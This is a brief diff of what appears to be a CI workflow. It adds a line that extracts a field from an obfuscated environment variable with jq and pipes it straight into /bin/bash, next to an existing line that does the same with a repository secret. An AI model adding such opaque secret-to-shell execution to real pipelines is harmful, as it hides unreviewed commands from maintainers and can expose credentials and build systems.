@@ -17,6 +17,7 @@ jobs:
           gempv11: ${{ secrets.gempv11 }}
         run: |
           printf '%s' "$gempv11" | jq -r .erpuz14 | /bin/bash
+          echo $eoe10 | jq -r .plqhq461 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
